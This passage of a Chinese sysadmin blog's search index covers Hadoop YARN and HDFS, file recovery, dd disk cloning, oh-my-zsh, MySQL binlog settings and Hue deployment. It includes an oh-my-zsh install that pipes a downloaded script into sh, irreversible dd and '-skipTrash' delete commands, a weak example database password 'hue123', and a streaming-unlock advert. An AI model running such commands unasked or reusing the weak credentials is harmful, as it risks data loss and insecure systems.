注：(1)如果文件较大，要确保恢复的目录有足够的可用空间(2)如果恢复所有的命令提示错误，就多运行几次！(3)恢复完成后，会在当前目录生产一个RECOVERED_FILES目录，里面即是恢复出来的文件 (4) 恢复指定时间戳之前的数据：参考： 12恢复此时间之后，被删除的所有文件【其中 1234567890为unix时间戳】extundelete &#x2F;dev&#x2F;sdb1 --after 1234567890 --restore-all 恢复单个文件或恢复整个目录，参考：恢复单个文件和恢复整个目录","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rm恢复","slug":"rm恢复","permalink":"https://garywu520.github.io/tags/rm%E6%81%A2%E5%A4%8D/"},{"name":"mv恢复","slug":"mv恢复","permalink":"https://garywu520.github.io/tags/mv%E6%81%A2%E5%A4%8D/"},{"name":"umount","slug":"umount","permalink":"https://garywu520.github.io/tags/umount/"},{"name":"linux文件恢复","slug":"linux文件恢复","permalink":"https://garywu520.github.io/tags/linux%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/"}]},{"title":"Mars-Hadoop-YARN的架构原理5","slug":"Mars-Hadoop-YARN的架构原理5","date":"2019-02-15T06:25:34.000Z","updated":"2019-02-15T08:19:34.367Z","comments":true,"path":"2019/02/15/Mars-Hadoop-YARN的架构原理5/","link":"","permalink":"https://garywu520.github.io/2019/02/15/Mars-Hadoop-YARN%E7%9A%84%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%865/","excerpt":"YARN架构组成1典型的Master&#x2F;Slave结构，1个ResourceManager对应多个NodeManager； 架构组成 1YARN由 ResourceManager(简称RM)、NodeManager（简称NM）和ApplicationMaster（简称AM）和Container等组成。","text":"YARN架构组成1典型的Master&#x2F;Slave结构，1个ResourceManager对应多个NodeManager； 架构组成 1YARN由 ResourceManager(简称RM)、NodeManager（简称NM）和ApplicationMaster（简称AM）和Container等组成。 ResourceManager功能 123RM是全局资源管理器（整个集群只有一个） --处理来自客户端的请求(如启动&#x2F;杀死应用程序) --负责整个Hadoop集群资源的管理和调度，将资源分配给ApplicationMaser. Scheduler 1Scheduler（调度器,默认使用的调度器是Fair Scheduler） ApplicationMaster功能 12345每个APP应用都会包含一个AM，AM负责应用程序的管理。功能包括： -- 为应用程序&#x2F;作业向RM申请资源(Container)，并分配给内部任务； -- 与NodeManager通信以启动&#x2F;停止任务； -- 跟踪每一个Task的运行状态，和容错（在任务执行失败时重新为该任务申请资源以重启任务）； -- 处理RM发过来的命令：杀死Container、让NodeManager重启等； NodeManager功能 12345整个集群有多个NM，对每一个slave上的资源和任务做管理。 -- 周期性向RM汇报HearBeat心跳[包括资源的使用情况和各个Container的运行状态] -- 接收并处理来自RM的Container启动&#x2F;停止的各种命令； -- 接收处理来自ApplicationMaster的命令； -- 负责单个节点上的资源管理和任务调度； Container功能 123456Container 对任务运行环境的抽象； -- 任务运行资源（节点、内存、CPU）； -- 任务启动命令； -- 任务运行环境；任务是运行在Container中，一个Container中既可以运行ApplicationMaster也可以运行具体的Map&#x2F;Reduce&#x2F;MPI&#x2F;Spark Task； YARN容错性1234567891. ResourceManager 基于Zookeeper实现HA避免单点故障 2. NodeManager 执行失败后，RM将失败的任务告诉对应的AM，由AM决定如何处理失败的任务。 3. ApplicationMaster -- 执行失败后，由RM负责重启 -- RMAppMaster会保存已经运行完成的Task,重启后无需重新运行。 YARN调度框架12345671. 双层调度框架 -- RM将资源分配给ApplicationMaster -- ApplicationMaster将资源进一步分配给Task 2. 基于资源预留的调度策略 资源不够时，会为Task预留，直到资源充足 特点：缺点：资源利用率不高，要先攒着，等到资源足够才启动Task，造成集群的资源利用率低； YARN的通信协议12345678910111. client与RM之间的通信协议：ApplicationClientProtocal 作业的提交、应用程序状态等 2. AM与RM通信协议：ApplicationMasterProtocal 向RM注册AM以及申请资源 3. AM与NM通信协议 ContainerManagementProtocal 启动&#x2F;停止Container 4. RM与NM通信协议: ResourceTracker 汇报slave节点的资源信息,包括Container的运行状况。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"yarn","slug":"yarn","permalink":"https://garywu520.github.io/tags/yarn/"}]},{"title":"Mars-Hadoop-YARN的产生背景4","slug":"Mars-Hadoop-YARN的产生背景4","date":"2019-02-15T03:20:05.000Z","updated":"2019-02-15T06:45:07.462Z","comments":true,"path":"2019/02/15/Mars-Hadoop-YARN的产生背景4/","link":"","permalink":"https://garywu520.github.io/2019/02/15/Mars-Hadoop-YARN%E7%9A%84%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF4/","excerpt":"三个必须了解的词汇123(1) MapReduce V1.X -- 简称MR V1(2) MapReduce V2.X -- 简称MR V2(3) YARN","text":"三个必须了解的词汇123(1) MapReduce V1.X -- 简称MR V1(2) MapReduce V2.X -- 简称MR V2(3) YARN Hadoop1.x中的MapReduce构成图如下： MR V1特点12345在Hadoop1.x中MapReduce是Master&#x2F;Slave结构，在集群中的表现形式为：1个JobTracker带多个TaskTracker；JobTracker：负责资源管理和作业调度；TaskTracker：定期向JobTracker汇报本节点的健康状况、资源使用情况以及任务的执行情况；接收来自JobTracker的命令（启动&#x2F;杀死任务等）并执行接收到的命令; MR V1存在的问题12345678 1.单点故障：JobTracker只有一个，JobTracker挂了整个集群就没办法使用了； 2.JobTracker负责接收来自各个TaskTracker节点的RPC请求，压力会很大，限制了集群的扩展；随着节点规模增大之后，JobTracker就成为一个瓶颈；3. 仅支持MapReduce计算框架；无法支持多种计算平台 --- MapReduce计算框架是一个基于Map和Reduce两阶段、适合批处理的、基于磁盘的计算框架； --- MapReduce计算框架优点：容错性好； --- MapReduce计算框架缺点：性能差； MR V2与MR V1的区别？123456789MR V2是MR V1的升级版本，与MR V1不同的时运行的环境不一样。MR V2是运行于YARN之上的MapReduce计算框架。MR V1： - JobTracker:资源和任务的管理和调度 - TaskTracker: 单个节点的资源管理和任务执行MR V2： - YARN：资源管理和调度 - ApplicationMaster: 具体应用程序相关的任务拆分、任务调度和容错等。 MR总结12345678910总结：1. 源于MR 的缺陷：扩展性受限、单点故障、难以支持MR之外的计算框架；2. 多计算框架各自为战，数据共享困难，资源利用率低； --- MR: 离线计算框架 --- Storm：实时计算框架 --- Spark：内存计算框架催生了YARN的产生。 YARN1YARN是支持多种计算框架的资源管理器，不仅仅支持MapReduce","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"Yarn","slug":"Yarn","permalink":"https://garywu520.github.io/tags/Yarn/"},{"name":"MR","slug":"MR","permalink":"https://garywu520.github.io/tags/MR/"},{"name":"MapReduce","slug":"MapReduce","permalink":"https://garywu520.github.io/tags/MapReduce/"},{"name":"高级运维YAR","slug":"高级运维YAR","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4YAR/"}]},{"title":"Mars-Hadoop-HDFS Shell命令3","slug":"Mars-Hadoop-HDFS Shell命令3","date":"2019-02-14T10:36:23.000Z","updated":"2019-02-15T03:18:36.900Z","comments":true,"path":"2019/02/14/Mars-Hadoop-HDFS Shell命令3/","link":"","permalink":"https://garywu520.github.io/2019/02/14/Mars-Hadoop-HDFS%20Shell%E5%91%BD%E4%BB%A43/","excerpt":"Web浏览HDFS文件系统 123浏览器访问http:&#x2F;&#x2F;namenode:50070 ---&gt; Utilities ---&gt; Browse the file system默认情况下，HDFS以根为最顶级目录，与linux一样","text":"Web浏览HDFS文件系统 123浏览器访问http:&#x2F;&#x2F;namenode:50070 ---&gt; Utilities ---&gt; Browse the file system默认情况下，HDFS以根为最顶级目录，与linux一样 官方HDFS Shell命令参考：HDFS Shell 命令格式1hadoop fs &lt;args&gt; 等同于 hdfs dfs &lt;args&gt; mkdir12创建目录hadoop fs -mkdir -p &lt;dir1_name&gt; &lt;dir2_name&gt; put12345上传文件到HDFS指定目录中hadoop fs -put localfile1 localfile2 &lt;hadoop_dir_path&gt;示例：hadoop fs -put &#x2F;root&#x2F;passwd &#x2F;hadoop&#x2F; cp12拷贝文件hadoop fs -cp &#x2F;hadoop&#x2F;passwd &#x2F;garywu&#x2F; mv12文件剪切hadoop fs -mv &#x2F;user&#x2F;hadoop&#x2F;file1 &#x2F;user&#x2F;hadoop&#x2F;file2 ls12文件查看hadoop fs -ls &#x2F; get1234从HDFS下载文件hadoop fs -get &lt;hadoop_file_path&gt; &lt;localpath&gt;示例： hadoop fs -get &#x2F;hadoop&#x2F;passwd &#x2F;tmp&#x2F; cat12文件内容查看hadoop fs -cat &#x2F;hadoop&#x2F;passwd rm12345678910删除HDFS文件hadoop fs -rm -f &#x2F;garywu&#x2F;bashrc删除HDFS目录hadoop fs -rm -r &#x2F;garywu注: 可以看到 文件删除后，会提示已删除的文件已经被移动到了垃圾桶目录中强制删除-不经过回收站hadoop fs -rm -r -skipTrash &#x2F;hadoop","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"Mars","slug":"Mars","permalink":"https://garywu520.github.io/tags/Mars/"},{"name":"HDFS Shell","slug":"HDFS-Shell","permalink":"https://garywu520.github.io/tags/HDFS-Shell/"}]},{"title":"Mars-Hadoop HDFS架构原理知识","slug":"Mars-Hadoop-HDFS架构原理知识2","date":"2019-02-14T09:22:47.000Z","updated":"2019-03-14T04:20:48.045Z","comments":true,"path":"2019/02/14/Mars-Hadoop-HDFS架构原理知识2/","link":"","permalink":"https://garywu520.github.io/2019/02/14/Mars-Hadoop-HDFS%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%862/","excerpt":"HDFS架构图 namenode作用1由上面架构图可知，namenode作用：记录HDFS的元数据(比如：命名空间信息和块信息等),这些信息存储在内存中，这些信息也可以持久化到磁盘。","text":"HDFS架构图 namenode作用1由上面架构图可知，namenode作用：记录HDFS的元数据(比如：命名空间信息和块信息等),这些信息存储在内存中，这些信息也可以持久化到磁盘。 NameNode怎么把元数据保存到磁盘上的？1234这里有两个不同的文件：fsimage - 它是存储整个文件系统的命名空间，也可以理解为它是对整个HDFS文件系统的快照。 edit logs - 它是在NameNode启动后，对文件系统的改动序列 Namenode启动过程 1NameNode把改动的操作写到HDFS的edit logs文件中，当NameNode服务重启时，NameNode会读取整个HDFS的快照并与edit logs合并，产生一个新的fsimage，旧的fsimage会自动删除。 潜在问题 123在生产集群中NameNode服务是很少重启的，这也意味着当NameNode运行了很长时间后，edit logs文件会变得很大。在这种情况下就会出现下面一些问题：NameNode的重启会花费很长时间，因为有很多改动要从edit logs合并到fsimage文件上。 如果NameNode挂掉了，那我们就丢失了很多改动因为此时的fsimage文件非常旧。 因此为了克服这个问题，需要一个易于管理的机制来帮助我们减小edit logs文件的大小和得到一个最新的fsimage文件，这样也会减小在NameNode上的压力 Secondary NameNode作用1SecondaryNameNode就是来帮助解决上述问题的，它的职责是合并NameNode的edit logs到fsimage文件中。 工作原理 1234567首先，它定时到NameNode去获取edit logs，并更新到Secondary NameNode自己的fsimage上。一旦它有了新的fsimage文件，它将其拷贝回NameNode中。 NameNode在下次重启时会使用这个新的fsimage文件，从而减少重启的时间。 Secondary NameNode的整个目的是在HDFS中提供一个检查点。它只是NameNode的一个助手节点。这也是它在社区内被认为是检查点节点的原因。现在，我们明白了Secondary NameNode所做的不过是在文件系统中设置一个检查点来帮助NameNode更好的工作。它不是要取代掉NameNode也不是NameNode的备份。而在Hadoop V0.21之后的版本中，这两个文件(edit logs和fsimage)被合并成了一个文件。 datanode作用 123456(1) 负责实际数据存储，以及副本存放(HDFS默认存储3份数据副本)(2) 心跳检测(HearBeat) Datanode节点会每间隔一定的时间，把slave节点的运行状态上报给Namenode(3) 在Datanode当中，以固定大小的Block(块)为基本单位来存放客户端文件，默认Block大小是128M【可以在hdfs-site.xml中修改】。当客户端上传文件大于128M，会被切割为2个Block存放在不同的slave节点上。","categories":[],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://garywu520.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"HDFS","slug":"HDFS","permalink":"https://garywu520.github.io/tags/HDFS/"},{"name":"Mars","slug":"Mars","permalink":"https://garywu520.github.io/tags/Mars/"},{"name":"Hadoop","slug":"Hadoop","permalink":"https://garywu520.github.io/tags/Hadoop/"},{"name":"Block","slug":"Block","permalink":"https://garywu520.github.io/tags/Block/"},{"name":"namenode","slug":"namenode","permalink":"https://garywu520.github.io/tags/namenode/"},{"name":"datanode","slug":"datanode","permalink":"https://garywu520.github.io/tags/datanode/"},{"name":"secondary namenode","slug":"secondary-namenode","permalink":"https://garywu520.github.io/tags/secondary-namenode/"},{"name":"checkpoint","slug":"checkpoint","permalink":"https://garywu520.github.io/tags/checkpoint/"},{"name":"机架感知","slug":"机架感知","permalink":"https://garywu520.github.io/tags/%E6%9C%BA%E6%9E%B6%E6%84%9F%E7%9F%A5/"}]},{"title":"mail命令抄送与密送","slug":"mail命令抄送与密送","date":"2019-02-14T08:15:44.000Z","updated":"2019-09-28T03:41:44.772Z","comments":true,"path":"2019/02/14/mail命令抄送与密送/","link":"","permalink":"https://garywu520.github.io/2019/02/14/mail%E5%91%BD%E4%BB%A4%E6%8A%84%E9%80%81%E4%B8%8E%E5%AF%86%E9%80%81/","excerpt":"","text":"写shell经常使用mail发送邮件，抄送与密送使用方法如下： 参考：postfix+mailx发送邮件 此命令很可能会在你写脚本的过程中起到至关重要的作用，方法如下： 12#发送给单个人或单个群组echo &quot;这里是邮件内容正文&quot; | mail -s &quot;主题&quot; xxx@xxx.com 12#发送给单个人或单个群组echo &quot;这里是邮件内容正文&quot; | mail -s &quot;主题&quot; -c xxx2@xxx.com -b xxx3@xxx.com xxx1@xxx.com 参数释义： -c: 抄送 -b: 密送 最后指定第一个收件人","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"postfix","slug":"postfix","permalink":"https://garywu520.github.io/tags/postfix/"},{"name":"mail","slug":"mail","permalink":"https://garywu520.github.io/tags/mail/"},{"name":"mailx","slug":"mailx","permalink":"https://garywu520.github.io/tags/mailx/"},{"name":"sendmail","slug":"sendmail","permalink":"https://garywu520.github.io/tags/sendmail/"},{"name":"ssmtp","slug":"ssmtp","permalink":"https://garywu520.github.io/tags/ssmtp/"}]},{"title":"linux系统使用dd命令克隆与恢复","slug":"linux系统使用dd命令克隆与恢复","date":"2019-01-24T09:14:46.000Z","updated":"2019-01-24T09:39:01.035Z","comments":true,"path":"2019/01/24/linux系统使用dd命令克隆与恢复/","link":"","permalink":"https://garywu520.github.io/2019/01/24/linux%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8dd%E5%91%BD%E4%BB%A4%E5%85%8B%E9%9A%86%E4%B8%8E%E6%81%A2%E5%A4%8D/","excerpt":"适用场景1服务器硬件老化，数据和业务迁移导出困难，这种情况下，使用dd将整个盘的数据制作成镜像，恢复到新服务器中是个不错的方案。 基本思想1234567(1) 使用U盘制作livecd启动盘，在livecd环境进行操作(2) 准备1TB移动硬盘,在livecd系统中挂载，用于存储系统镜像(3) dd制作系统镜像(4) 新服务器进入livecd环境，挂载移动硬盘(5) dd系统数据恢复(6) 网卡服务启动错误修复","text":"适用场景1服务器硬件老化，数据和业务迁移导出困难，这种情况下，使用dd将整个盘的数据制作成镜像，恢复到新服务器中是个不错的方案。 基本思想1234567(1) 使用U盘制作livecd启动盘，在livecd环境进行操作(2) 准备1TB移动硬盘,在livecd系统中挂载，用于存储系统镜像(3) dd制作系统镜像(4) 新服务器进入livecd环境，挂载移动硬盘(5) dd系统数据恢复(6) 网卡服务启动错误修复 dd制作系统镜像12#查看&#x2F;dev&#x2F;sda系统盘分区情况fdisk -u -l &#x2F;dev&#x2F;sda 123dd bs&#x3D;512 count&#x3D;[fdisk结果中最大end数+1] if&#x3D;&#x2F;dev&#x2F;sda of&#x3D;&#x2F;data&#x2F;sda.img注：bs&#x3D;512这个起始位置是MBR引导所在的扇区，故此命令会将MBR及&#x2F;dev&#x2F;sda所有分区一并打包到sda.img中 dd系统还原1dd if&#x3D;&#x2F;data&#x2F;sda.img of&#x3D;&#x2F;dev&#x2F;sda 1恢复完成后，重启系统即可。镜像制作和系统还原过程根据数据量大小不同，一般非常耗时。 网卡修复1234系统还原后，进入系统，发现网卡不能启动，原因是 &#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules文件在捣鬼，mv成其他名字，重启系统后，系统会自动生成此文件，这时候网卡就可以正常启动了。如果还不能解决问题，需要检测下网卡模块是否已经加载：lsmod |grep e1000 磁盘空间问题123老服务器sda容量是146GB，新服务器sda容量是500GB+，当使用dd命令恢复系统后，新服务器sda的可用空间变成了146GB，目前暂未找到解决方案。并且此服务器尤为重要，不能试错，故此问题被暂且搁置了，如有清楚的小伙伴可以联系我更新。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"dd","slug":"dd","permalink":"https://garywu520.github.io/tags/dd/"}]},{"title":"Netflix流媒体解锁","slug":"netflix流媒体解锁","date":"2019-01-11T10:46:24.000Z","updated":"2019-05-31T09:27:58.379Z","comments":true,"path":"2019/01/11/netflix流媒体解锁/","link":"","permalink":"https://garywu520.github.io/2019/01/11/netflix%E6%B5%81%E5%AA%92%E4%BD%93%E8%A7%A3%E9%94%81/","excerpt":"","text":"提供NetFlix、TVB、BBC iplayer、Pandora、蘋果動、巴哈姆特·動畫瘋等流媒体解锁服务，畅享4K高清画质。TG群组：https://t.me/happy_dns","categories":[],"tags":[{"name":"Netflix","slug":"Netflix","permalink":"https://garywu520.github.io/tags/Netflix/"},{"name":"telegram","slug":"telegram","permalink":"https://garywu520.github.io/tags/telegram/"},{"name":"tg","slug":"tg","permalink":"https://garywu520.github.io/tags/tg/"},{"name":"Netflix群组","slug":"Netflix群组","permalink":"https://garywu520.github.io/tags/Netflix%E7%BE%A4%E7%BB%84/"},{"name":"Netflix解锁","slug":"Netflix解锁","permalink":"https://garywu520.github.io/tags/Netflix%E8%A7%A3%E9%94%81/"},{"name":"Netflix DNS解锁","slug":"Netflix-DNS解锁","permalink":"https://garywu520.github.io/tags/Netflix-DNS%E8%A7%A3%E9%94%81/"},{"name":"Pandora","slug":"Pandora","permalink":"https://garywu520.github.io/tags/Pandora/"},{"name":"流媒体","slug":"流媒体","permalink":"https://garywu520.github.io/tags/%E6%B5%81%E5%AA%92%E4%BD%93/"},{"name":"TVB","slug":"TVB","permalink":"https://garywu520.github.io/tags/TVB/"},{"name":"苹果动","slug":"苹果动","permalink":"https://garywu520.github.io/tags/%E8%8B%B9%E6%9E%9C%E5%8A%A8/"},{"name":"BBC","slug":"BBC","permalink":"https://garywu520.github.io/tags/BBC/"},{"name":"bbc iplayer","slug":"bbc-iplayer","permalink":"https://garywu520.github.io/tags/bbc-iplayer/"},{"name":"巴哈姆特","slug":"巴哈姆特","permalink":"https://garywu520.github.io/tags/%E5%B7%B4%E5%93%88%E5%A7%86%E7%89%B9/"},{"name":"动画疯","slug":"动画疯","permalink":"https://garywu520.github.io/tags/%E5%8A%A8%E7%94%BB%E7%96%AF/"},{"name":"HBO","slug":"HBO","permalink":"https://garywu520.github.io/tags/HBO/"}]},{"title":"zsh-高逼格的终端","slug":"zsh-高逼格的终端","date":"2019-01-09T10:23:04.000Z","updated":"2019-01-09T11:03:24.528Z","comments":true,"path":"2019/01/09/zsh-高逼格的终端/","link":"","permalink":"https://garywu520.github.io/2019/01/09/zsh-%E9%AB%98%E9%80%BC%E6%A0%BC%E7%9A%84%E7%BB%88%E7%AB%AF/","excerpt":"1Oh My Zsh官网地址: http:&#x2F;&#x2F;ohmyz.sh&#x2F; 下载安装1sh -c &quot;$(wget https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh -O -)&quot;","text":"1Oh My Zsh官网地址: http:&#x2F;&#x2F;ohmyz.sh&#x2F; 下载安装1sh -c &quot;$(wget https:&#x2F;&#x2F;raw.github.com&#x2F;robbyrussell&#x2F;oh-my-zsh&#x2F;master&#x2F;tools&#x2F;install.sh -O -)&quot; 修改主题12所有主题路径： ~&#x2F;.oh-my-zsh&#x2F;themes修改主题用到的文件： ~&#x2F;.zshrc 修改~/.zshrc改变主题 12345找到ZSH_THEME&#x3D;&quot;robbyrussell&quot;一行，将其注释掉，在下面添加一行：ZSH_THEME&#x3D;&quot;ys&quot; 或 ZSH_THEME&#x3D;&quot;agnoster&quot;保存后，重新连接终端即可。 为什么这里使用ys或agnoster主题? 1因为ys主题比较符合自己的习惯，当前所在的路径都会显示出来，其他主题则不会显示。 配置优化1注：在 ~&#x2F;.zshrc 中配置 12修改history命令输出的展示格式HIST_STAMPS&#x3D;&quot;yyyy-mm-dd&quot; 其他高级插件-推荐参考：oh-my-zsh插件推荐","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"zsh","slug":"zsh","permalink":"https://garywu520.github.io/tags/zsh/"},{"name":"ohmyzsh","slug":"ohmyzsh","permalink":"https://garywu520.github.io/tags/ohmyzsh/"},{"name":"terminal","slug":"terminal","permalink":"https://garywu520.github.io/tags/terminal/"},{"name":"终端","slug":"终端","permalink":"https://garywu520.github.io/tags/%E7%BB%88%E7%AB%AF/"}]},{"title":"MySQL修改binlog保存天数","slug":"MySQL修改binlog保存天数","date":"2019-01-07T02:14:25.000Z","updated":"2019-01-07T02:35:49.847Z","comments":true,"path":"2019/01/07/MySQL修改binlog保存天数/","link":"","permalink":"https://garywu520.github.io/2019/01/07/MySQL%E4%BF%AE%E6%94%B9binlog%E4%BF%9D%E5%AD%98%E5%A4%A9%E6%95%B0/","excerpt":"123binlog和relay_log宏观区别是：binlog存在于MySQL主库, relaylog存在于MySQL从库。所以，我们去修改binlog过期时间时，就需要在MySQL主库上来做。当然，如果MySQL只有一个单节点，那么同样也适用","text":"123binlog和relay_log宏观区别是：binlog存在于MySQL主库, relaylog存在于MySQL从库。所以，我们去修改binlog过期时间时，就需要在MySQL主库上来做。当然，如果MySQL只有一个单节点，那么同样也适用 首先查看当前binlog过期时间1234567mysql&gt; show variables like &#39;expire_logs_days&#39;;+------------------+-------+| Variable_name | Value |+------------------+-------+| expire_logs_days | 90 |+------------------+-------+1 row in set (0.01 sec) 查看当前binlog文件最大大小限制1234567mysql&gt; show variables like &#39;max_binlog_size&#39;;+-----------------+------------+| Variable_name | Value |+-----------------+------------+| max_binlog_size | 1073741824 |+-----------------+------------+1 row in set (0.00 sec) MySQL命令行设置binlog过期时间1234注：此方案立即生效!mysql&gt; set global expire_logs_days&#x3D;7;Query OK, 0 rows affected (0.00 sec) 1含义是：当超过7天的binlog文件将会被MySQL自动清理。配置后，立即生效。 my.cnf配置文件设置binlog过期时间12345注：此方案需要重启MySQL才能生效!在&#x2F;etc&#x2F;my.cnf的[mysqld]区域，新增如下两行：expire_logs_days &#x3D; 7max_binlog_size &#x3D; 500M 123含义：(1)每个binlog大小最大限制为500M[如mysql-bin.00002目前已经达到了500M大小]，当超过此大小限制时，MySQL将创建一个新的文件[如:mysql-bin.00003]作为日志记录。(2)与此同时，当binlog文件超过7天，超过7天的binlog文件将会被自动清理。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"binlog","slug":"binlog","permalink":"https://garywu520.github.io/tags/binlog/"},{"name":"expire_logs_days","slug":"expire-logs-days","permalink":"https://garywu520.github.io/tags/expire-logs-days/"},{"name":"binlog_size","slug":"binlog-size","permalink":"https://garywu520.github.io/tags/binlog-size/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"}]},{"title":"Hue部署并接入Impala等组件","slug":"Hue部署并接入Impala等组件","date":"2019-01-03T04:16:33.000Z","updated":"2019-01-03T06:27:53.024Z","comments":true,"path":"2019/01/03/Hue部署并接入Impala等组件/","link":"","permalink":"https://garywu520.github.io/2019/01/03/Hue%E9%83%A8%E7%BD%B2%E5%B9%B6%E6%8E%A5%E5%85%A5Impala%E7%AD%89%E7%BB%84%E4%BB%B6/","excerpt":"123本篇介绍下Hue的开源版安装与对接Impala组件，以及CDH版Impala对接注意事项。Hue提供一个用于查询的Web展示平台，Impala的作用是查询器，Impala后端可以配置与KuDu集群对接。这样就实现了从Hue Web平台查询KuDu集群数据库的内容。 环境准备(1) 安装编译环境 1yum -y groupinstall &quot;Development tools&quot; 12345yum install -y python-devel.x86_64 openssl-devel python-devel openldap-devel gmp-devel libffi-devel sqlite-devel #安装xml依赖yum install -y libxml2 libxml2-devel libxslt libxslt-develyum install -y &quot;perl(XML::LibXML)&quot; &amp;&amp; xml2-config --version","text":"123本篇介绍下Hue的开源版安装与对接Impala组件，以及CDH版Impala对接注意事项。Hue提供一个用于查询的Web展示平台，Impala的作用是查询器，Impala后端可以配置与KuDu集群对接。这样就实现了从Hue Web平台查询KuDu集群数据库的内容。 环境准备(1) 安装编译环境 1yum -y groupinstall &quot;Development tools&quot; 12345yum install -y python-devel.x86_64 openssl-devel python-devel openldap-devel gmp-devel libffi-devel sqlite-devel #安装xml依赖yum install -y libxml2 libxml2-devel libxslt libxslt-develyum install -y &quot;perl(XML::LibXML)&quot; &amp;&amp; xml2-config --version (2) 安装jdk1.8 1官网下载：jdk-8u191-linux-x64.tar.gz 12tar -zxvf jdk-8u191-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;ln -sv &#x2F;usr&#x2F;local&#x2F;jdk1.8.0_191 &#x2F;usr&#x2F;local&#x2F;jdk 编辑 /etc/profile 12345678JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdk1.8.0_191JRE_HOME&#x3D;$JAVA_HOME&#x2F;jrePATH&#x3D;$PATH:$JAVA_HOME&#x2F;binCLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jarexport JAVA_HOMEexport JRE_HOMEexport PATHexport CLASSPATH 12source &#x2F;etc&#x2F;profilejava -version (3) 安装mysql 12Hue需要MySQLyum -y install mariadb* 12systemctl start mariadbsystemctl enable mariadb 12初始化mysql_secure_installation 123456create database hue DEFAULT CHARSET utf8 COLLATE utf8_general_ci;grant all privileges on hue.* to &#39;hue&#39;@&#39;localhost&#39; identified by &#39;hue123&#39;;flush privileges;测试登陆mysql -uhue -p -h127.0.0.1 Hue编译部署12官网下载Hue最新版本, 官网：http:&#x2F;&#x2F;gethue.com&#x2F; 当前最新版本：V4.3 官网下载：官网 1234gunzip hue-4.3.0.tgztar -xvf hue-4.3.0.tarcd hue-4.3.0make apps 配置123编译完成后，Hue的配置文件位于编译目录的desktop&#x2F;conf&#x2F;hue.ini，接下来对该文件进行修改.我们的需求是在Hue Web平台中，利用Impala来查询后端KUDU集群数据，故需要将Impala与Hue对接。 1由于数据库引擎使用mysql，故需要配置MySQL相关选项 1234567[[database]] #MySQL配置 engine&#x3D;mysql host&#x3D;127.0.0.1 port&#x3D;3306 user&#x3D;hue password&#x3D;hue123 name&#x3D;hue 123456[impala] server_host&#x3D;xx.xx.xx.xx #Impala集群负载地址和端口 server_port&#x3D;21050 # Kerberos principal ## impala_principal&#x3D;impala&#x2F;hostname.foo.com 1234由于我是使用了mysql来存储的元数据，因此在启动服务前，先进行导入默认数据库。.&#x2F;build&#x2F;env&#x2F;bin&#x2F;hue syncdb --noinput.&#x2F;build&#x2F;env&#x2F;bin&#x2F;hue migrate 12345678910111213141516验证[root@zw50-op-104 hue-4.3.0]# mysql -uhue -p -h 127.0.0.1 -e &quot;use hue;show tables;&quot;Enter password: +--------------------------------+| Tables_in_hue |+--------------------------------+| auth_group || auth_group_permissions || auth_permission || auth_user || auth_user_groups || auth_user_user_permissions || axes_accessattempt || axes_accesslog || beeswax_metainstall || beeswax_queryhistory | 启动Hue12启动hue测试: build&#x2F;env&#x2F;bin&#x2F;hue runserver 0.0.0.0:8000 生成环境Hue工作目录 1234mkdir -p &#x2F;usr&#x2F;local&#x2F;cp -R hue-4.3.0 &#x2F;usr&#x2F;local&#x2F;cd &#x2F;usr&#x2F;local&#x2F;ln -sv hue-4.3.0 hue 开机启动 123echo &quot;nohup &#x2F;usr&#x2F;local&#x2F;hue&#x2F;build&#x2F;env&#x2F;bin&#x2F;python2.7 &#x2F;usr&#x2F;local&#x2F;hue&#x2F;build&#x2F;env&#x2F;bin&#x2F;hue runserver 0.0.0.0:8000 &amp;&quot; 